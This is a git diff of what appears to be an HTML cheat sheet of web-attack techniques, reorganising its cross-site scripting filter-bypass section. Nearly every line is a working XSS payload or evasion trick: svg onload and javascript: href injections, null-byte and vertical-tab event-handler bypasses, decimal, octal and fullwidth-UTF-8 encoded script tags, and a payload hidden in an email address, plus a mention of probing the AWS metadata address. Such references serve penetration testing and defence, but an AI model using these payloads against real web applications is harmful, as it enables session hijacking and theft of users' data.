@@ -76,9 +76,8 @@ New Line breaks often work on <.a/href=%2520javascript:alert(1)>  <.a/href=%20ja
 Injecting anchor tag without whitespaces -breaking up characters with decoded value of %26Tab%3B (url decode character) between each character<br>
  <br>
  Try bypassing spaces with a bullet if / does not work - <code><.svg•onload=alert(1)> </code><br>
- To bypass parenthesis for string using ` <br>
- To bypass quotes for string use String.fromCharCode() function
- Bypassing on...= filter using null byte onmouseover\x00="alert(1)",  Using vertical tab - onmouseover\x0b="alert(1)", Using a / - onmouseover/="alert(1)"
+ <br>
+ To bypass quotes for string use String.fromCharCode() function <br>
  <br>
  <h3> Encoding </h3>
  Try URL encoding on the payload <br>
@@ -92,7 +91,8 @@ E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert
 %EF%BC%9E becomes > <br>
 %EF%BC%9C becomes < <br>
  Try UTF-7, UTF-8 UTF-16BE, UTF-32 encoding, Base64 encoding, Hexadecimal encoding without semicolon, Decimal HTML character, <br>
- Decimal HTML character without semicolon (<.script>alert(1)<./script> to &#60&#115&#99&#114&#105&#112&#116&#62&#97&#108&#101&#114&#116&#40&#49&#41&#60&#47&#115&#99&#114&#105&#112&#116&#62),  Octal encoding (javascript:prompt(1) to javascript:'\160\162\157\155\160\164\50\61\51) <br>
+ Decimal HTML character without semicolon (<.script>alert(1)<./script> to &#60&#115&#99&#114&#105&#112&#116&#62&#97&#108&#101&#114&#116&#40&#49&#41&#60&#47&#115&#99&#114&#105&#112&#116&#62) <br> 
+ Octal encoding (javascript:prompt(1) to javascript:'\160\162\157\155\160\164\50\61\51) <br>
  
  <br>
  <h3> File Upload XSS </h3><br>
@@ -155,11 +155,14 @@ Try with AWS 169.254.169.254 address if AWS <br>
  onerror=alert;throw 1337 <br>
  {onerror=alert}throw 1337 <br>
  throw onerror=alert,'some string',123,'haha' <br>
+ Try using ` <br>
  <br>
  <h3> Bypass onxxxx blacklist </h3><br>
  // Bypass onxxx= filter with a null byte/vertical tab <br>
  onerror\x00=alert(0)<br>
  onerror\x0b=alert(0)<br>
+ Bypassing on...= filter using null byte onmouseover\x00="alert(1)",  Using vertical tab - onmouseover\x0b="alert(1)", Using a / - onmouseover/="alert(1)" <br>
+ <br>
  <br>
  <h3> Bypass email check </h3> <br>
  ".><.svg/onload=confirm(1)>"@x.y <br>
